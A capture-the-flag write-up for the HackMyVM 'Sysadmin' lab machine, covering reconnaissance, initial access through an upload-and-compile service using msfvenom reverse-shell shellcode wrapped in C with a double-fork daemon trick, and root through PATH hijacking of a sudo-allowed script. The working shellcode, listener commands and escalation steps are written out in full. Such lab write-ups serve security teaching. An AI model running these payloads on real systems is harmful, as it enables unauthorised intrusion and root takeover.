# Sysadmin

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Sysadmin | Sublarge | Beginner | HackMyVM |

**Summary:** Sysadmin is a beginner-level Linux machine that demonstrates web application exploitation through C code injection and privilege escalation via PATH hijacking. The attack vector involves exploiting a C code compilation service that accepts user-uploaded .c files, compiles them with dangerous flags (`-z execstack -fno-stack-protector -no-pie`), and executes the resulting binary. Initial access is gained by uploading malicious C shellcode that establishes a reverse shell connection. Privilege escalation is achieved by exploiting a sudo-allowed script that uses relative paths, allowing for PATH hijacking to execute arbitrary commands as root.

---

## Reconnaissance

### Network Discovery
The target was identified through network scanning, revealing a VirtualBox VM at IP address 192.168.100.37:

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
...
[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.37 08:00:27:24:93:E8 VirtualBox
```

### Port Scanning
A comprehensive Nmap scan revealed two open services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sCV -p- 192.168.100.37
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-27 11:50 WIB
Nmap scan report for 192.168.100.37
Host is up (0.0046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey:
|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: C Code Upload
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.87 seconds
```

**Key Findings:**
- **SSH (Port 22)**: OpenSSH 8.4p1 Debian - Standard SSH service
- **HTTP (Port 80)**: Apache httpd 2.4.62 - Web server with "C Code Upload" title

### Web Application Analysis

Browsing to the web application revealed a C code upload platform:

![site](image.png)

**Web Application Features:**
- File upload form accepting `.c` files only
- Automatic compilation and execution of uploaded C code
- Warning that compiled binaries are deleted after execution

Source code analysis revealed critical security information:

```html
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <title>C Code Upload</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>
        /* ---------- RESET ---------- */
        *{box-sizing:border-box;margin:0;padding:0}
        body{font-family:Arial,Helvetica,sans-serif;color:#333;padding:30px;background:#fff}
        /* ---------- CARD ---------- */
        .card{
            max-width:420px;
            margin:0 auto;
            border:1px solid #ccc;
            border-radius:8px;
            padding:25px 30px;
            box-shadow:0 2px 6px rgba(0,0,0,.1);
            text-align:center;
        }
        .card h1{font-size:24px;margin-bottom:8px}
        .card p.sub{font-size:14px;color:#666;margin-bottom:20px}
        /* ---------- ALERT ---------- */
        .alert{padding:10px 12px;border-radius:6px;font-size:14px;margin-bottom:20px;text-align:left}
        .alert.success{background:#e7f7ed;color:#0e5132;border-left:4px solid #28a745}
        .alert.error{background:#fce7e7;color:#721c24;border-left:4px solid #dc3545}
        .alert.warn{background:#fff3cd;color:#856404;border-left:4px solid #ffc107}
        /* ---------- FORM ---------- */
        form input[type=file]{width:100%;margin-bottom:15px;padding:8px;border:1px solid #bbb;border-radius:4px}
        form input[type=submit]{width:100%;padding:10px;background:#1976d2;color:#fff;border:0;border-radius:4px;cursor:pointer}
        form input[type=submit]:hover{background:#125a9c}
        /* ---------- FOOTER ---------- */
        .footer{margin-top:20px;font-size:12px;color:#888}
    </style>
</head>
<body>
    <!-- main card -->
    <div class="card">
        <h1>C Code Upload Platform</h1>
        <p class="sub">Upload your <code>.c</code> file to compile and run.</p>

        <!-- PHP upload handler -->
        
        <!-- upload form -->
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="src" accept=".c" required>
            <input type="submit" value="Upload & Compile">
        </form>
	
	<div class="footer">
   	    <b>Notice:</b> Your compiled binary will be deleted immediately after execution.
        </div>
    </div>

    <!--
    gcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out
    -->
</body>
</html>
```

**Critical Security Issues Identified:**

1. **Dangerous GCC Compilation Flags** (from HTML comment):
   ```bash
   gcc -std=c11 -nostdinc -I/var/www/include -z execstack -fno-stack-protector -no-pie test.c -o a.out
   ```
   - `-z execstack`: Makes the stack executable (shellcode execution possible)
   - `-fno-stack-protector`: Disables stack protection mechanisms
   - `-no-pie`: Disables Position Independent Executable

2. **Automatic Execution**: Uploaded and compiled code is automatically executed
3. **File Deletion**: Binary deletion after execution could terminate reverse shells

---

## Initial Access

### Shellcode Generation
Using MSFvenom to generate a Linux x64 reverse shell payload:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.100.1 LPORT=4444 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of c file: 338 bytes
unsigned char buf[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
"\x48\xb9\x02\x00\x11\x5c\xc0\xa8\x64\x01\x51\x48\x89\xe6"
"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
"\x89\xe6\x0f\x05";
```

### Payload Development

**First Attempt (test1.c)** - Basic shellcode execution:
```c
unsigned char buf[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
"\x48\xb9\x02\x00\x11\x5c\xc0\xa8\x64\x01\x51\x48\x89\xe6"
"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
"\x89\xe6\x0f\x05";

int main() {
    ((void(*)())buf)();
    return 0;
}
```

**Result:** Connection established but immediately terminated due to binary deletion.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
id
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 49409
uid=1000(echo) gid=1000(echo) groups=1000(echo)

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$
```

**Second Attempt (test2.c)** - Daemon persistence technique:
```c
unsigned char buf[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97"
"\x48\xb9\x02\x00\x11\x5c\xc0\xa8\x64\x01\x51\x48\x89\xe6"
"\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce"
"\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f"
"\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48"
"\x89\xe6\x0f\x05";

int main() {
    int pid = fork();
    if (pid != 0) return 0;
    setsid();
    pid = fork();
    if (pid != 0) _exit(0);
    ((void(*)())buf)();
    return 0;
}
```

**Result:** Successful persistent connection achieved using daemon technique (double fork + setsid).

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
id
connect to [172.21.44.133] from (UNKNOWN) [172.21.32.1] 49419
uid=1000(echo) gid=1000(echo) groups=1000(echo)
id
uid=1000(echo) gid=1000(echo) groups=1000(echo)
which python3
/usr/bin/python3
which bash
/usr/bin/bash
```

### Shell Stabilization

Upgrading to a fully interactive TTY shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo@Sysadmin:/home/echo$ ^Z
zsh: suspended  nc -lvnp 4444

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444

echo@Sysadmin:/home/echo$ export TERM=xterm-256color
echo@Sysadmin:/home/echo$ echo $SHELL
/bin/bash
echo@Sysadmin:/home/echo$ ls -la
total 28
drwxr-xr-x 3 echo echo 4096 Aug 14 11:21 .
drwxr-xr-x 3 root root 4096 Aug 14 09:07 ..
lrwxrwxrwx 1 root root    9 Aug 14 09:08 .bash_history -> /dev/null
-rw-r--r-- 1 echo echo  220 Aug 14 09:07 .bash_logout
-rw-r--r-- 1 echo echo 3526 Aug 14 09:07 .bashrc
drwxr-xr-x 3 echo echo 4096 Aug 14 09:07 .local
-rw-r--r-- 1 echo echo  807 Aug 14 09:07 .profile
-rw-r--r-- 1 root root   44 Aug 14 09:39 user.txt
```

**Initial Access Summary:**
- Successfully gained shell access as user `echo` (uid=1000)
- User flag located at `/home/echo/user.txt`
- Bash history is redirected to `/dev/null` (security measure)

---

## Privilege Escalation

### Sudo Enumeration

Checking sudo privileges for the current user:

```bash
echo@Sysadmin:/home/echo$ sudo -l
Matching Defaults entries for echo on Sysadmin:
    !env_reset, mail_badpass, !env_reset, always_set_home

User echo may run the following commands on Sysadmin:
    (root) NOPASSWD: /usr/local/bin/system-info.sh
```

**Critical Finding:** 
- User can execute `/usr/local/bin/system-info.sh` as root without password
- `!env_reset` flag means environment variables are preserved
- This creates potential for PATH hijacking

### Script Analysis

Examining the sudo-allowed script:

```bash
echo@Sysadmin:/home/echo$ ls -la /usr/local/bin/system-info.sh
-rwxr-xr-x 1 root root 650 Aug 14 09:32 /usr/local/bin/system-info.sh
echo@Sysadmin:/home/echo$ cat /usr/local/bin/system-info.sh
#!/bin/bash

#===================================
# Daily System Info Report
#===================================

echo "Starting daily system information collection at $(date)"
echo "------------------------------------------------------"

echo "Checking disk usage..."
df -h

echo "Checking log directory..."
ls -lh /var/log/
find /var/log/ -type f -name "*.gz" -mtime +30 -exec rm {} \;

echo "Checking critical services..."
systemctl is-active sshd
systemctl is-active cron

echo "Collecting CPU and memory information..."
cat /proc/cpuinfo
free -m

echo "------------------------------------------------------"
echo "Report complete at $(date)"
```

**Vulnerability Analysis:**
- Script calls `df` without absolute path (`df -h` instead of `/bin/df -h`)
- Environment variables are not reset due to `!env_reset` sudo configuration
- This allows PATH manipulation to hijack the `df` command

### PATH Hijacking Exploitation

Creating malicious `df` binary:

```bash
echo@Sysadmin:/home/echo$ cd /tmp
echo@Sysadmin:/tmp$ mkdir exploit
echo@Sysadmin:/tmp$ cd exploit
echo@Sysadmin:/tmp/exploit$ cat > df << 'EOF'
> #!/bin/bash
> /bin/bash -i
> EOF
echo@Sysadmin:/tmp/exploit$ chmod +x df
```

**Executing the privilege escalation:**

```bash
echo@Sysadmin:/tmp/exploit$ sudo PATH=/tmp/exploit:$PATH /usr/local/bin/system-info.sh
Starting daily system information collection at Tue Jan 27 00:49:18 EST 2026
------------------------------------------------------
Checking disk usage...
root@Sysadmin:/tmp/exploit# id
uid=0(root) gid=0(root) groups=0(root)
root@Sysadmin:/tmp/exploit# cd
root@Sysadmin:~# ls
root.txt
```

### Flag Capture

Retrieving both user and root flags:

```bash
root@Sysadmin:~# cat /home/echo/user.txt root.txt
flag{user-9[REDACTED]}
flag{root-8[REDACTED]}
```

---

## Attack Chain Summary

1. **Reconnaissance**: Network scanning identified target VM (192.168.100.37) with SSH (22) and HTTP (80) services running
2. **Vulnerability Discovery**: Web application analysis revealed insecure C code compilation service with dangerous GCC flags (-z execstack, -fno-stack-protector, -no-pie)
3. **Exploitation**: Generated Linux x64 reverse shell shellcode using MSFvenom and embedded it in C code with daemon persistence technique (double fork + setsid) to survive binary deletion
4. **Internal Enumeration**: Gained shell access as user 'echo' and discovered sudo privileges allowing execution of /usr/local/bin/system-info.sh as root without password
5. **Privilege Escalation**: Exploited PATH hijacking vulnerability in system-info.sh script due to preserved environment variables (!env_reset) and relative path usage for 'df' command, achieving root access

**Key Techniques Used:**
- Shellcode injection via C compilation service
- Daemon persistence to survive process termination
- PATH hijacking for privilege escalation
- Environment variable preservation exploitation